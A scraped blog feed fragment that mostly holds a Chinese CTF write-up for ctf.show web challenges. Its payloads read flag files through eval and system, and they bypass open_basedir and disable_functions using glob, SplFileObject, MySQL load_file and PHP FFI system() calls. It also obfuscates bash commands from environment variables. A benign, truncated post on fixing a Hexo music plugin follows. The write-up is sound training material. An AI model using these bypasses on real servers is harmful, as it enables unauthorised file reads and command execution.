$((~$(($((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(()))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))))))<br><span class="hljs-number">-36</span>取反得到<span class="hljs-number">35</span><br>再增加一个<br>$((~$(($((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))))))<br></code></pre></td></tr></tbody></table></figure><h3 id="web59-65"><a href="#web59-65" class="headerlink" title="web59-65"></a>web59-65</h3><figure class="highlight php"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">'c'</span>])){<br>        <span class="hljs-variable">$c</span>= <span class="hljs-variable">$_POST</span>[<span class="hljs-string">'c'</span>];<br>        <span class="hljs-keyword">eval</span>(<span class="hljs-variable">$c</span>);<br>}<br></code></pre></td></tr></tbody></table></figure><p>扫目录再读flag：</p><figure class="highlight ini"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs ini"><span class="hljs-attr">c</span>=print_r(scandir(dirname(<span class="hljs-string">'FILE'</span>)))<span class="hljs-comment">;</span><br><span class="hljs-attr">c</span>=show_source(<span class="hljs-string">'flag.php'</span>)<span class="hljs-comment">;</span><br></code></pre></td></tr></tbody></table></figure><p>PY2:</p><figure class="highlight isbl"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs isbl"><span class="hljs-variable">c</span>=<span class="hljs-function"><span class="hljs-title">show_source</span>(<span class="hljs-title">next</span>(<span class="hljs-title">array_reverse</span>(<span class="hljs-title">scandir</span>(<span class="hljs-title">pos</span>(<span class="hljs-title">localeconv</span>())))));</span><br></code></pre></td></tr></tbody></table></figure><p>从59-65禁用的函数可能是不一样的，但是都没有禁用show_source函数，都可以用show_source来得到flag</p><h3 id="web66-67"><a href="#web66-67" class="headerlink" title="web66-67"></a>web66-67</h3><figure class="highlight php"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">'c'</span>])){<br>        <span class="hljs-variable">$c</span>= <span class="hljs-variable">$_POST</span>[<span class="hljs-string">'c'</span>];<br>        <span class="hljs-keyword">eval</span>(<span class="hljs-variable">$c</span>);<br>}<span class="hljs-keyword">else</span>{<br>    <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br>} <br></code></pre></td></tr></tbody></table></figure><p>首先要找到flag所在的文件</p><figure class="highlight ini"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs ini"><span class="hljs-attr">c</span>=var_dump(scandir(<span class="hljs-string">'/'</span>))<span class="hljs-comment">;</span><br><span class="hljs-attr">c</span>=print_r(scandir(<span class="hljs-string">'/'</span>))<span class="hljs-comment">;</span><br></code></pre></td></tr></tbody></table></figure><p>可以再根目录下找到flag.txt</p><p>从题目上也可以轻松看到highlight_file函数没有被ban掉：</p><figure class="highlight ini"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ini"><span class="hljs-attr">c</span>=highlight_file(<span class="hljs-string">'/flag.txt'</span>)<span class="hljs-comment">;</span><br></code></pre></td></tr></tbody></table></figure><p>web67禁用了print_r函数</p><h3 id="web68-69-70"><a href="#web68-69-70" class="headerlink" title="web68,69,70"></a>web68,69,70</h3><p>禁用了highlight_file函数….</p><p>payload:</p><figure class="highlight ini"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ini"><span class="hljs-attr">c</span>=include(<span class="hljs-string">'/flag.txt'</span>)<span class="hljs-comment">;</span><br></code></pre></td></tr></tbody></table></figure><h3 id="web71"><a href="#web71" class="headerlink" title="web71"></a>web71</h3><figure class="highlight php"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-title function_ invoke__">ini_set</span>(<span class="hljs-string">'display_errors'</span>, <span class="hljs-number">0</span>);<br><span class="hljs-comment">// 你们在炫技吗？</span><br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">'c'</span>])){<br>        <span class="hljs-variable">$c</span>= <span class="hljs-variable">$_POST</span>[<span class="hljs-string">'c'</span>];<br>        <span class="hljs-keyword">eval</span>(<span class="hljs-variable">$c</span>);<br>        <span class="hljs-variable">$s</span> = <span class="hljs-title function_ invoke__">ob_get_contents</span>();<br>        <span class="hljs-title function_ invoke__">ob_end_clean</span>();<br>        <span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">preg_replace</span>(<span class="hljs-string">"/[0-9]|[a-z]/i"</span>,<span class="hljs-string">"?"</span>,<span class="hljs-variable">$s</span>);<br>}<span class="hljs-keyword">else</span>{<br>    <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br>}<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></tbody></table></figure><p>代码执行流程：</p><figure class="highlight php"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">'c'</span>]))：检查是否接收到名为 c 的 POST 请求参数。如果存在该参数，则继续执行下面的代码，否则不执行。<br><br><span class="hljs-variable">$c</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">'c'</span>];：将名为 c 的 POST 请求参数的值赋给变量 <span class="hljs-variable">$c</span>。这个变量将保存待执行的代码。<br><br><span class="hljs-keyword">eval</span>(<span class="hljs-variable">$c</span>);：使用 <span class="hljs-keyword">eval</span>() 函数执行 <span class="hljs-variable">$c</span> 变量中的代码。<span class="hljs-keyword">eval</span>() 函数会将字符串作为 PHP 代码进行解析和执行。<br><br><span class="hljs-variable">$s</span> = <span class="hljs-title function_ invoke__">ob_get_contents</span>();：通过使用输出缓冲区函数 <span class="hljs-title function_ invoke__">ob_get_contents</span>()，将执行代码后的输出内容保存到变量 <span class="hljs-variable">$s</span> 中。<br><br><span class="hljs-title function_ invoke__">ob_end_clean</span>();：使用 <span class="hljs-title function_ invoke__">ob_end_clean</span>() 函数清空输出缓冲区，确保后续的输出不会与之前的内容混合。<br><br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">preg_replace</span>(<span class="hljs-string">"/[0-9]|[a-z]/i"</span>,<span class="hljs-string">"?"</span>,<span class="hljs-variable">$s</span>);：对变量 <span class="hljs-variable">$s</span> 中的内容进行处理，并用 ? 替换其中的数字和字母。<span class="hljs-title function_ invoke__">preg_replace</span>() 函数执行正则表达式替换操作，将匹配到的数字和字母替换为 ?。最后，使用 <span class="hljs-keyword">echo</span> 语句将处理后的内容输出到浏览器。<br></code></pre></td></tr></tbody></table></figure><p>附件拿到源码，看到我们的命令行执行了但缓冲区被清除替换，我们看不到原本执行的内容，在include后面加上退出命令即可；</p><p>payload:</p><figure class="highlight awk"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">c=include(<span class="hljs-string">'/flag.txt'</span>);<span class="hljs-keyword">exit</span>;<br></code></pre></td></tr></tbody></table></figure><h3 id="web72"><a href="#web72" class="headerlink" title="web72"></a>web72</h3><p>尝试列目录，报错：</p><figure class="highlight awk"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">Operation not permitted <span class="hljs-keyword">in</span> <span class="hljs-regexp">/var/</span>www<span class="hljs-regexp">/html/i</span>ndex.php(<span class="hljs-number">19</span>)<br></code></pre></td></tr></tbody></table></figure><p>包含读取文件目录都被open_basedir给限制了，采用glob绕过</p><figure class="highlight awk"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs awk">c=<span class="hljs-variable">$a</span> = <span class="hljs-string">"glob:///*.txt"</span>;<br>        <span class="hljs-keyword">if</span> ( <span class="hljs-variable">$b</span> = opendir(<span class="hljs-variable">$a</span>) ) {<br>                <span class="hljs-keyword">while</span> ( (<span class="hljs-variable">$file</span> = readdir(<span class="hljs-variable">$b</span>)) !== false ) {<br>                        echo <span class="hljs-string">"filename:"</span>.<span class="hljs-variable">$file</span>.<span class="hljs-string">"\n"</span>;<br>                }<br>                closedir(<span class="hljs-variable">$b</span>);<br>        }<br><span class="hljs-keyword">exit</span>();<br></code></pre></td></tr></tbody></table></figure><h3 id="web73-74"><a href="#web73-74" class="headerlink" title="web73,74"></a>web73,74</h3><p>可以使用php原生类来做题：</p><p>先DirectoryIterator获取目录,再SplFileObject读取文件；</p><figure class="highlight awk"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs awk">c=<span class="hljs-variable">$a</span>=new DirectoryIterator(<span class="hljs-string">"glob:///*"</span>);foreach(<span class="hljs-variable">$a</span> as <span class="hljs-variable">$f</span>){ echo <span class="hljs-variable">$f</span>.<span class="hljs-string">'~'</span> ; };<span class="hljs-keyword">exit</span>;<br>c=<span class="hljs-variable">$a</span>=new SplFileObject(<span class="hljs-string">"/flagc.txt"</span>);foreach(<span class="hljs-variable">$a</span> as <span class="hljs-variable">$f</span>){ echo <span class="hljs-variable">$f</span>};<span class="hljs-keyword">exit</span>();<br></code></pre></td></tr></tbody></table></figure><p>代码执行逻辑：</p><figure class="highlight awk"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-variable">$a</span> = new SplFileObject(<span class="hljs-string">"/flagc.txt"</span>);：创建一个 SplFileObject 对象，将文件路径 <span class="hljs-string">"/flagc.txt"</span> 作为参数传递给构造函数。SplFileObject 是 PHP 提供的一个类，用于读取文件内容。<br>foreach (<span class="hljs-variable">$a</span> as <span class="hljs-variable">$f</span>)：使用 foreach 循环遍历 SplFileObject 对象 <span class="hljs-variable">$a</span>，将每行内容赋给变量 <span class="hljs-variable">$f</span>。<br>echo <span class="hljs-variable">$f</span>;：在每次循环中，使用 echo 语句将变量 <span class="hljs-variable">$f</span> 的值输出到浏览器。这将逐行显示文件内容。<br><span class="hljs-keyword">exit</span>();：使用 <span class="hljs-keyword">exit</span>() 函数终止脚本的执行，确保只输出文件内容而不继续执行其他代码<br></code></pre></td></tr></tbody></table></figure><h3 id="web75-76"><a href="#web75-76" class="headerlink" title="web75-76"></a>web75-76</h3><p>利用上述方法可以读取到flag在flag36.txt,但是无法读取到数据，报错：</p><figure class="highlight css"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs css">Fatal error: Uncaught RuntimeException: SplFileObject::<span class="hljs-built_in">__construct</span>(): open_basedir restriction in effect. <span class="hljs-built_in">File</span>(/flag36.txt) is not within the allowed <span class="hljs-built_in">path</span>(s): (/var/www/html/) in /var/www/html/index.<span class="hljs-built_in">php</span>(<span class="hljs-number">19</span>) : <span class="hljs-built_in">eval</span>()<span class="hljs-string">'d code:1 Stack trace: #0 /var/www/html/index.php(19) : eval()'</span>d <span class="hljs-built_in">code</span>(<span class="hljs-number">1</span>): SplFileObject-&gt;<span class="hljs-built_in">__construct</span>(<span class="hljs-string">'/flag36.txt'</span>) #<span class="hljs-number">1</span> /var/www/html/index.<span class="hljs-built_in">php</span>(<span class="hljs-number">19</span>): <span class="hljs-built_in">eval</span>() #<span class="hljs-number">2</span> {<span class="hljs-selector-tag">main</span>} thrown in /<span class="hljs-selector-tag">var</span>/www/<span class="hljs-selector-tag">html</span>/index<span class="hljs-selector-class">.php</span>(<span class="hljs-number">19</span>) : <span class="hljs-built_in">eval</span>()<span class="hljs-string">'d code on line 1</span><br></code></pre></td></tr></tbody></table></figure><p>我们仍可以用上一题方法读到文件名；但读不出来数据，直接包含也不行；</p><p>这里要通过数据库来读取该文件，前提是我们要知道数据库的信息</p><p>通过sql语句绕过open_basedir和disable_function</p><figure class="highlight awk"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">c=try {<span class="hljs-variable">$dbh</span> = new PDO(<span class="hljs-string">'mysql:host=localhost;dbname=ctftraining'</span>, <span class="hljs-string">'root'</span>,<span class="hljs-string">'root'</span>);foreach(<span class="hljs-variable">$dbh</span>-&gt;query(<span class="hljs-string">'select load_file("/flag36.txt")'</span>) as <span class="hljs-variable">$row</span>){echo(<span class="hljs-variable">$row</span>[<span class="hljs-number">0</span>]).<span class="hljs-string">"|"</span>; }<span class="hljs-variable">$dbh</span> = null;}catch (PDOException <span class="hljs-variable">$e</span>) {echo <span class="hljs-variable">$e</span>-&gt;getMessage();<span class="hljs-keyword">exit</span>(<span class="hljs-number">0</span>);}<span class="hljs-keyword">exit</span>(<span class="hljs-number">0</span>);<br></code></pre></td></tr></tbody></table></figure><h3 id="web77✘"><a href="#web77✘" class="headerlink" title="web77✘"></a>web77✘</h3><p>依然可以通过PHP原生类获取flag所在文件：</p><figure class="highlight awk"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">c=<span class="hljs-variable">$a</span>=new DirectoryIterator(<span class="hljs-string">"glob:///*"</span>);foreach(<span class="hljs-variable">$a</span> as <span class="hljs-variable">$f</span>){ echo <span class="hljs-variable">$f</span>.<span class="hljs-string">'~'</span> ; };<span class="hljs-keyword">exit</span>;<br></code></pre></td></tr></tbody></table></figure><p>两个文件flag36x.txt和readflag,我们要通过执行readflag的脚本来拿到flag</p><p>php7.4的特性可以利用ffi函数接口</p><p>FFI（Foreign Function Interface），即外部函数接口，允许从用户区调用C代码。当PHP所有的命令执行函数被禁用后，通过PHP 7.4的新特性FFI可以实现用PHP代码调用C代码的方式，先声明C中的命令执行函数，然后再通过FFI变量调用该C函数即可Bypass disable_functions。</p><p>payload: 查文件还是利用原生类即可；</p><figure class="highlight awk"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs awk">c=<span class="hljs-variable">$ffi</span> = FFI::cdef(<span class="hljs-string">"int system(const char *command);"</span>);<br><span class="hljs-variable">$a</span>=<span class="hljs-string">"/readflag &gt;/var/www/html/1.txt"</span>; <span class="hljs-regexp">//</span>在这里修改命令<br><span class="hljs-variable">$ffi</span>-&gt;system(<span class="hljs-variable">$a</span>);<br><span class="hljs-keyword">exit</span>();<br></code></pre></td></tr></tbody></table></figure><h3 id="web118"><a href="#web118" class="headerlink" title="web118"></a>web118</h3><figure class="highlight php"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">'code'</span>])){<br>    <span class="hljs-variable">$code</span>=<span class="hljs-variable">$_POST</span>[<span class="hljs-string">'code'</span>];<br>    <span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">'/\x09|\x0a|[a-z]|[0-9]|\/|\(|\)|\[|\]|\\\\|\+|\-|\!|\=|\^|\*|\x26|\%|\&lt;|\&gt;|\'|\"|\`|\||\,/'</span>, <span class="hljs-variable">$code</span>)){<br><span class="hljs-keyword">echo</span> <span class="hljs-string">'&lt;div align="center"&gt;'</span>.<span class="hljs-title function_ invoke__">system</span>(<span class="hljs-variable">$code</span>).<span class="hljs-string">'&lt;/div&gt;'</span>;<br>}<br><span class="hljs-keyword">else</span>{<br> <span class="hljs-keyword">echo</span> <span class="hljs-string">'&lt;div align="center"&gt;evil input&lt;/div&gt;'</span>;<br>}<br>}<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></tbody></table></figure><p>查看首页源码提示：</p><figure class="highlight xml"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-comment">&lt;!-- system($code);--&gt;</span><br></code></pre></td></tr></tbody></table></figure><p>Linux 操作系统中有许多内置的环境变量，它们提供了系统和用户级别的配置和信息。下面是一些常见的 Linux 内置变量的介绍：</p><ol><li>PATH：指定可执行程序的搜索路径。当您在终端中输入一个命令时，系统会按照 PATH 中指定的路径顺序搜索可执行文件。</li><li>HOME：指定当前用户的主目录路径。当您在终端中使用 <code>cd ~</code> 或 <code>cd</code> 命令时，会切换到 HOME 目录。</li><li>USER 和 USERNAME：当前登录用户的用户名。</li><li>SHELL：指定当前用户所使用的默认 shell 程序的路径。</li><li>PWD：当前工作目录的路径。当您在终端中使用 <code>pwd</code> 命令时，会显示当前所在的路径。</li></ol><p>${PATH}环境变量 /bin</p><p>${PWD}当前目录 /var/www/html</p><p>我们可以使用${PATH:~0}得到环境变量的最后一位字符n,数字可以由字母替代</p><p>可以使用切片取得返回的字母 例:${PWD:0:1}</p><p>payload:</p><p>这里数字不可用</p><figure class="highlight ruby"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ruby"><span class="hljs-variable">${</span><span class="hljs-variable constant_">PATH</span><span class="hljs-symbol">:~A</span>}<span class="hljs-variable">${</span><span class="hljs-variable constant_">PWD</span><span class="hljs-symbol">:~A</span>}$<span class="hljs-variable constant_">IFS</span>?<span class="hljs-string">??</span><span class="hljs-string">?.</span><span class="hljs-string">??</span>?  <span class="hljs-comment">#nl flag.php</span><br></code></pre></td></tr></tbody></table></figure><h3 id="web119"><a href="#web119" class="headerlink" title="web119"></a>web119</h3><p>这个题需要用到三个变量：</p><pre><code class="hljs">PHP_CFLAGS=-fstack-protector-strong # 通过前面的题配置文件获得获得PHP_VERSION=7.3.22 # php版本SHLVL 是记录多个 Bash 进程实例嵌套深度的累加器,进程第一次打开shell时${SHLVL}=1，然后在此shell中再打开一个shell时${SHLVL}=2</code></pre><p>py1:tac flag.txt</p><p>在PHP_CFLAGS中，直接就有tac可以使用，从第三位开始占三个位置，我们需要得到版本号中的三，从而直接使用tac，经测试${PHP_VERSION:${PHP_VERSION:<del>A}:</del>${SHLVL}}的长度为三，是我们所需要的，构造payload：</p><figure class="highlight ruby"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ruby"><span class="hljs-variable">${</span><span class="hljs-variable constant_">PHP_CFLAGS</span><span class="hljs-symbol">:</span><span class="hljs-variable">${</span><span class="hljs-variable constant_">PHP_VERSION</span><span class="hljs-symbol">:</span><span class="hljs-variable">${</span><span class="hljs-variable constant_">PHP_VERSION</span><span class="hljs-symbol">:~A</span>}<span class="hljs-symbol">:~</span><span class="hljs-variable">${</span><span class="hljs-variable constant_">SHLVL</span>}}<span class="hljs-symbol">:</span><span class="hljs-variable">${</span><span class="hljs-variable constant_">PHP_VERSION</span><span class="hljs-symbol">:</span><span class="hljs-variable">${</span><span class="hljs-variable constant_">PHP_VERSION</span><span class="hljs-symbol">:~A</span>}<span class="hljs-symbol">:~</span><span class="hljs-variable">${</span><span class="hljs-variable constant_">SHLVL</span>}}} <span class="hljs-string">??</span><span class="hljs-string">??</span>.<span class="hljs-string">??</span>?<br></code></pre></td></tr></tbody></table></figure><p>PY2:</p><figure class="highlight shell"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$</span><span class="language-bash">{PWD:<span class="hljs-variable">${#}</span>:<span class="hljs-variable">${#SHLVL}</span>}???<span class="hljs-variable">${PWD:<span class="hljs-variable">${#}</span>:<span class="hljs-variable">${#SHLVL}</span>}</span>?<span class="hljs-variable">${USER:~<span class="hljs-variable">${PHP_VERSION:~A}</span>:<span class="hljs-variable">${PHP_VERSION:~A}</span>}</span> ????.???</span><br><span class="hljs-meta prompt_"># </span><span class="language-bash"><span class="hljs-built_in">pwd</span>=/var/www/html</span><br><span class="hljs-meta prompt_"># </span><span class="language-bash"><span class="hljs-variable">${#}</span>是0，<span class="hljs-variable">${SHLVL}</span>为1</span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">USER=www-data</span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">payload即为 /???/?at ????.???   即/bin/cat flag.php</span><br></code></pre></td></tr></tbody></table></figure>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
    </categories>
    
    
    <tags>
      
      <tag>ctf_show</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>解决博客aplayer插件音乐失效问题</title>
    <link href="/posts/739f3d10/"/>
    <url>/posts/739f3d10/</url>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><h2 id="ISSUE"><a href="#ISSUE" class="headerlink" title="ISSUE"></a>ISSUE</h2><p>解决博客aplayer插件音乐失效问题</p><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>前几天发现博客音乐失效了，找找原因，解决下失效问题。</p><p>如果你只想知道关于aplayer插件音乐失效问题的内容，请在目录中找到需要的内容。</p><h2 id="Aplayer使用"><a href="#Aplayer使用" class="headerlink" title="Aplayer使用"></a>Aplayer使用</h2><p>音乐插件:hexo-tag-aplayer 官网：<a href="https://aplayer.js.org/#/">链接</a></p><p>安装执行以下命令：</p><figure class="highlight ada"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ada">npm install <span class="hljs-comment">--save hexo-tag-aplayer</span><br></code></pre></td></tr></tbody></table></figure><p>因为最新的aplayer版本已经支持MetingJS,往文章插入音乐使用起来更为方便，在aplayer启用MetingJS：</p><p>打开博客配置文件_config.yml，编辑以下内容：</p><figure class="highlight yaml"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-attr">aplayer:</span><br>  <span class="hljs-attr">meting:</span> <span class="hljs-literal">true</span><br></code></pre></td></tr></tbody></table></figure><p>文章插入音乐的方式：</p><figure class="highlight mel"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mel">{% meting <span class="hljs-string">"歌曲ID"</span> <span class="hljs-string">"服务器"</span> <span class="hljs-string">"类型"</span> <span class="hljs-string">"theme:#555"</span> <span class="hljs-string">"mutex:true"</span> <span class="hljs-string">"listmaxheight:340px"</span> <span class="hljs-string">"preload:auto"</span> %}<br></code></pre></td></tr></tbody></table></figure><p>在文章添加以上代码就可以在文章任何位置添加音乐了。</p><p>参数说明：</p><p>server指音乐平台，netease指网易云音乐，tencent指的是QQ音乐</p><p>一个完整的播放器至少指定音乐平台，类型和标识资源的ID</p><table><thead><tr><th>选项</th><th>默认</th><th>描述</th></tr></thead><tbody><tr><td>id(编号)</td><td>必须</td><td>歌曲ID /播放列表ID /专辑ID /搜索关键字</td></tr><tr><td>server(平台)</td><td>必须</td><td>音乐平台：netease，tencent，kugou，xiami，baidu</td></tr><tr><td>type（类型）</td><td>必须</td><td>song，playlist，album，search，artist</td></tr><tr><td>auto（支持类种 类）</td><td>options</td><td>音乐链接，支持：netease，tencent，xiami</td></tr><tr><td>fixed（固定模式）</td><td>false</td><td>启用固定模式，默认false</td></tr><tr><td>mini（迷你模式）</td><td>false</td><td>启用迷你模式,默认false</td></tr><tr><td>autoplay（自动播放）</td><td>false</td><td>音频自动播放，默认false</td></tr><tr><td>theme(主题颜色)</td><td>#2980b9</td><td>默认#2980b9</td></tr><tr><td>loop（循环）</td><td>all</td><td>播放器循环播放，值：“all”，one”，“none”</td></tr><tr><td>order(顺序)</td><td>list</td><td>播放器播放顺序，值：“list”，“random”</td></tr><tr><td>preload(加载)</td><td>auto</td><td>值：“none”，“metadata”，“’auto”</td></tr><tr><td>volume（声量）</td><td>0.7</td><td>默认音量，请注意播放器会记住用户设置，用户自己设置音量后默认音量将不起作用</td></tr><tr><td>mutex（限制）</td><td>true</td><td>防止同时播放多个玩家，在该玩家开始播放时暂停其他玩家</td></tr><tr><td>lrc-type（歌词）</td><td>0</td><td>歌词显示</td></tr><tr><td>list-folded（列表折叠）</td><td>false</td><td>指示列表是否应该首先折叠</td></tr><tr><td>list-max-height（最大高度）</td><td>340px</td><td>列出最大高度</td></tr><tr><td>storage-name（储存名称）</td><td>metingjs</td><td>存储播放器设置的localStorage键</td></tr></tbody></table><p>下面我以MetingJS在文章插入网易云音乐中的音乐来说明使用方法。</p><h3 id="使用示例：网易云音乐"><a href="#使用示例：网易云音乐" class="headerlink" title="使用示例：网易云音乐"></a>使用示例：网易云音乐</h3><p>1.进入网易云音乐网页版</p><p>​<a href="https://music.163.com/">网易云音乐网页版链接</a></p><p>2.找到资源的ID</p><p>如谭晶的《爱的神话》，在网易云音乐的链接是<code>https://music.163.com/#/song?id=26217047</code></p><p>26217047就是标识这首歌资源的唯一ID，类型就是song</p><p>插入文章的代码的一个示例：</p><figure class="highlight mel"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mel">{% meting <span class="hljs-string">"26217047"</span> <span class="hljs-string">"netease"</span> <span class="hljs-string">"song"</span> <span class="hljs-string">"theme:#555"</span> <span class="hljs-string">"mutex:true"</span> <span class="hljs-string">"listmaxheight:340px"</span> <span class="hljs-string">"preload:auto"</span> %}<br></code></pre></td></tr></tbody></table></figure>    <div id="aplayer-RJruqQDf" class="aplayer aplayer-tag-marker meting-tag-marker" data-id="26217047" data-server="netease" data-type="song" data-mode="circulation" data-autoplay="false" data-mutex="true" data-listmaxheight="340px" data-preload="auto" data-theme="#555"></div><p>如果是想引用歌单到文章中：</p><p>某个歌单的链接：<code>https://music.163.com/#/playlist?id=2983726621</code></p><p>歌单ID就是2983726621，类型是playlist</p><p>插入文章的代码的一个示例：</p><figure class="highlight mel"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mel">{% meting <span class="hljs-string">"2983726621"</span> <span class="hljs-string">"netease"</span> <span class="hljs-string">"playlist"</span> <span class="hljs-string">"theme:#555"</span> <span class="hljs-string">"mutex:true"</span> <span class="hljs-string">"listmaxheight:340px"</span> <span class="hljs-string">"preload:auto"</span> %}<br></code></pre></td></tr></tbody></table></figure><h2 id="音乐失效问题"><a href="#音乐失效问题" class="headerlink" title="音乐失效问题"></a>音乐失效问题</h2><h3 id="原因和解决方法"><a href="#原因和解决方法" class="headerlink" title="原因和解决方法"></a>原因和解决方法</h3><p>Aplayer用来解析的API失效了，在博客目录下<strong>Blog\Hexo\node_modules\meting\dist</strong>下可以找到用来解析的API:</p><figure class="highlight awk"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">https:<span class="hljs-regexp">//</span>api.i-meto.com<span 